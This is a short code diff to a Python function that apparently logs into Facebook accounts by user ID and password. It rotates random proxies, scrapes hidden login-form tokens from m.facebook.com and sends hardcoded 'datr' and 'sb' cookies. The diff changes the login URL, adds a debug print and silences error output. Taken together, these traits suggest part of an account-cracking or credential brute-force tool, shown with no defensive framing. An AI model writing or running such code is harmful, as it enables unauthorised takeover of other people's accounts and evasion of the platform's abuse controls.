@@ -1728,7 +1728,7 @@ def d(uid,pwx,tl):
             nip=random.choice(xvx)
             proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
             'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -1753,6 +1753,7 @@ def d(uid,pwx,tl):
             'a': '',
             '__user': '0',
             '_fb_noscript': 'true',}
+            print(data)
             cookies = {
             'datr': 'QtBZZ5pdw9yXQJE0ZygUaI3n',
             'sb': 'QtBZZwQbIwtJ9ikr_rQjmuJI',
@@ -1821,7 +1822,7 @@ def d(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        print({error})
+        #print({error})
         pass
 
 
